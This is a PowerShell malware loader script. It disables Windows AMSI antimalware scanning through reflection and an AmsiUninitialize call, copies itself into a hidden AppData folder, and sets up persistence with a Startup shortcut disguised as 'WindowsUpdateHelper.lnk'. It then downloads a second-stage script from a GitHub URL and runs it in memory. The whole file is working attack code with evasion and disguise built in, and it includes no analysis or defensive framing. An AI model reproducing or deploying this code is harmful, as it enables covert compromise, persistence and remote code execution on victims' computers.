$ErrorActionPreference = 'SilentlyContinue'

# === LAYER 1: AMSI BYPASS (Obfuscated amsiInitFailed) ===
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
    $field = $amsi.GetField(('amsiI'+'nitFailed'),('NonPu'+'blic,St'+'atic'))
    $field.SetValue($null,$true)
} catch {}

# === LAYER 2: ADVANCED BYPASS (Registry Provider Redirection + Uninitialize) ===
$RegKey = ($null, 'Software\Microsoft\AMSI\Providers')
try {
    $RegUtils = @"
    using System;
    using System.Runtime.InteropServices;
    public class RegUtils {
        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
"@
    Add-Type $RegUtils
    # Break provider loading by appending a space to the key path
    $key = ($RegKey[1] + ' ')
    $x = [RegUtils]::LoadLibrary('amsi.dll')
    $y = [RegUtils]::GetProcAddress($x, 'AmsiU'+'ninitialize')
    if ($y) {
        $Uninitialize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($y, [Type]([Action]))
        $Uninitialize.Invoke()
    }
} catch {}

# === SELF-PRESERVATION (Minimal) ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
if (-not (Test-Path $localPath)) {
    New-Item -ItemType Directory -Path (Split-Path $localPath -Parent) -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $localPath -Force
}

# === PERSISTENCE: Startup LNK (Obfuscated) ===
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $sc = $wsh.CreateShortcut($lnkPath)
    $sc.TargetPath = 'powershell.exe'
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $sc.WindowStyle = 7
    $sc.Save()
}

# === DOWNLOAD AND EXECUTE REAL PAYLOAD IN MEMORY ===
# This URL points to the FULLY OBFUSCATED version of your original launcher (with EXE dl/exec logic)
$payloadUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/stage2.ps1'
try {
    $script = (New-Object Net.WebClient).DownloadString($payloadUrl)
    Invoke-Expression $script
} catch {}
